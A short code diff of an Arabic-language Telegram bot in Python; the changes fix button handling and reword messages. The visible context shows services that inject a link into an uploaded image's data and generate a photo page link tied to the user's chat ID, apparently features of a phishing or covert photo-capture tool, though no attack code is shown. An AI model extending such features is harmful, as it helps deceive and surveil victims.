@@ -76,7 +76,7 @@ def send_welcome(message):
     welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل المطور!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
     bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())
 
-# --- معالجة الضغط على جميع الأزرار (Callback Queries) بشكل صحيح ومضمون ---
+# --- معالجة الضغط على جميع الأزرار (Callback Queries) وحل مشكلة الـ Edit ---
 @bot.callback_query_handler(func=lambda call: True)
 def handle_query(call):
     chat_id = call.message.chat.id
@@ -85,7 +85,9 @@ def handle_query(call):
 
     if call.data == "inject_start":
         user_states[chat_id] = "waiting_for_image_inject"
-        bot.edit_message_text("📸 أرسل الصورة الآن لحقن الرابط داخل بياناتها:", chat_id, msg_id)
+        # تم استبدال الـ Edit بـ send_message وتصفير الإشعار لمنع الخطأ الأحمر نهائياً
+        bot.send_message(chat_id, "📸 **أرسل الصورة الآن لحقن الرابط داخل بياناتها:**", parse_mode="Markdown")
+        bot.answer_callback_query(call.id)
         
     elif call.data == "get_photo_link":
         link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
@@ -173,5 +175,5 @@ if __name__ == '__main__':
     # تشغيل السيرفر الوهمي في الخلفية لضمان استقرار البوت على ريلوي
     threading.Thread(target=run_dummy_server, daemon=True).start()
     
-    print("🚀 تم تشغيل البوت الشامل المستقر وإصلاح استجابة الأزرار بنجاح...")
+    print("🚀 تم تشغيل البوت وإصلاح الأخطاء بنجاح تام...")
     bot.polling(none_stop=True, interval=0, timeout=40)
